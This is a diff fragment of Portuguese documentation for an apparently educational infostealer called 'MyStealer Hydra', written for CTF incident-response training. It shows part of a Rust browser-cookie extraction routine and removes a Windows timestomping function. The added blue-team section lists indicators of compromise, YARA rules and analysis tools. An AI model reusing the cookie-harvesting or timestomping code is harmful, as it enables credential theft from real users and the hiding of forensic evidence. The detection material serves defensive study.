+        Ok(CookieEntry {
+            domain: row.get(0)?,
+            name: row.get(1)?,
+            value: "[REDACTED]".to_string(), // Lab mode
+            expires: row.get(3).ok(),
+            is_secure: row.get::<_, i32>(4).unwrap_or(0) == 1,
+            is_http_only: row.get::<_, i32>(5).unwrap_or(0) == 1,
+        })
+    })?
+    .filter_map(|r| r.ok())
+    .collect();
+    
+    let _ = std::fs::remove_file(&tmp);
+    Ok(cookies)
 }
 ```
 
-### 5.2 Timestomping
+---
 
-```rust
-#[cfg(windows)]
-pub fn modify_timestamps(path: &Path, time: SystemTime) -> Result<(), IoError> {
-    use windows::Win32::Storage::FileSystem::{
-        SetFileTime, CreateFileW, OPEN_EXISTING,
-    };
+## 6. 🔍 Detecção e Defesa (Blue Team)
+
+### 6.1 Indicadores de Compromisso
+
+**Arquivos:**
+```yaml
+Linux:
+  - ~/.cache/fontconfig/alpha.lock
+  - ~/.cache/fontconfig/*.hb
+  
+Windows:
+  - %LOCALAPPDATA%\.cache\ms-runtime\*.lock
+  - %LOCALAPPDATA%\.cache\ms-runtime\*.hb
+```
+
+**Comportamento:**
+```yaml
+- Múltiplos processos idênticos (3 instâncias)
+- Arquivos .hb atualizados a cada 5 segundos
+- Respawn automático após kill
+- Acesso a Cookies/Login Data dos browsers
+- Leitura de /etc/machine-id
+```
+
+### 6.2 Yara Rules
+
+```yara
+rule MyStealer_Hydra_IPC {
+    meta:
+        description = "Detecta arquivos IPC do MyStealer Hydra"
     
-    let file_time = systemtime_to_filetime(time);
-    
-    unsafe {
-        let handle = CreateFileW(
-            // ...
-        )?;
+    strings:
+        $format = /\d+:\d{10}/  // PID:timestamp
         
-        SetFileTime(
-            handle,
-            Some(&file_time),  // Creation time
-            Some(&file_time),  // Access time
-            Some(&file_time),  // Modification time
-        )?;
-    }
+    condition:
+        filesize < 50 and $format
+}
+
+rule MyStealer_Obfuscated_Strings {
+    meta:
+        description = "Detecta padrões de XOR encoding"
     
-    Ok(())
+    strings:
+        // Padrões comuns de XOR decode
+        $xor1 = { 0F B6 ?? ?? 30 ?? }  // movzx + xor
+        
+    condition:
+        uint16(0) == 0x5A4D and $xor1
 }
 ```
 
----
+### 6.3 Ferramentas de Defesa
 
-## 6. Considerações de Segurança Defensiva
-
-### Detecção deste Tipo de Malware
-
-```rust
-// Indicadores de Compromisso (IOCs) para detecção:
-
-// 1. Acessos a arquivos sensíveis
-// - Cookies e Login Data dos navegadores
-// - Arquivos de carteiras crypto
-// - SSH keys, certificados
-
-// 2. Padrões de comportamento
-// - Coleta rápida de múltiplas fontes
-// - Criptografia de dados antes de envio
-// - Comunicação com endpoints suspeitos
-
-// 3. Artefatos no sistema
-// - Executável em locais não padrão
-// - Persistência em chaves de registro
-// - Tarefas agendadas suspeitas
-```
-
-### Ferramentas de Defesa Recomendadas
-
-- **EDR**: CrowdStrike, Carbon Black, SentinelOne
-- **SIEM**: Splunk, Elastic Security
-- **Yara Rules**: Para detecção de strings e padrões
-- **Sysmon**: Monitoramento de eventos Windows
+| Ferramenta | Uso |
+|------------|-----|
+| **Sysmon** | Monitorar CreateProcess, FileCreate |
+| **ProcMon** | Analisar I/O de arquivos |
+| **Wireshark** | Capturar exfiltração |
+| **x64dbg** | Debug dinâmico |
+| **IDA Pro** | Análise estática |
+| **Ghidra** | Decompilação |
 
 ---
 
-## Próximos Passos
+## 📚 Referências
 
-Ver [SETUP.md](SETUP.md) para configurar o ambiente de laboratório.
+- [MITRE ATT&CK](https://attack.mitre.org/)
+- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development)
+- [Anti-Debug Tricks](https://anti-debug.checkpoint.com/)
+- [VX Underground](https://vx-underground.org/)
 
+---
+
+*Documentação para fins educacionais - CTF IR Training*
